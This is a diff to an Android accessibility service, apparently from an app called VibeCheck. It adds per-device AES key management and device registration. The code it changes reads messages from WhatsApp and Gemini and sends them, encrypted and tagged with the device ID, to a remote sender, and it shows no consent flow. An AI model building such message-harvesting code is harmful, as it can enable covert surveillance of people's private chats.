@@ -7,6 +7,7 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import android.util.Log;
 
 import app.lovable.cb70405bb9cf47f6aac54784c26796c4.utils.AESEncryptor;
+import app.lovable.cb70405bb9cf47f6aac54784c26796c4.utils.KeyManager;
 import app.lovable.cb70405bb9cf47f6aac54784c26796c4.utils.MessageSender;
 
 import java.util.ArrayList;
@@ -38,11 +39,14 @@ public class VibeCheckAccessibilityService extends AccessibilityService {
     private static final int MIN_MSG_LENGTH = 3;
 
     private String deviceId;
+    private String aesKey;
 
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        aesKey = KeyManager.getOrCreateKey(this);
+        KeyManager.registerIfNeeded(this);
         Log.d(TAG, "Accessibility service connected, device: " + deviceId);
     }
 
@@ -127,7 +131,7 @@ public class VibeCheckAccessibilityService extends AccessibilityService {
     private void sendEncrypted(String message, String pkg) {
         try {
             String appName = pkg.equals(WHATSAPP_PKG) ? "whatsapp" : "gemini";
-            String[] result = AESEncryptor.encrypt(message);
+            String[] result = AESEncryptor.encrypt(message, aesKey);
             MessageSender.send(this, deviceId, appName, result[0], result[1], System.currentTimeMillis());
             Log.d(TAG, "Sent encrypted message from " + appName);
         } catch (Exception e) {
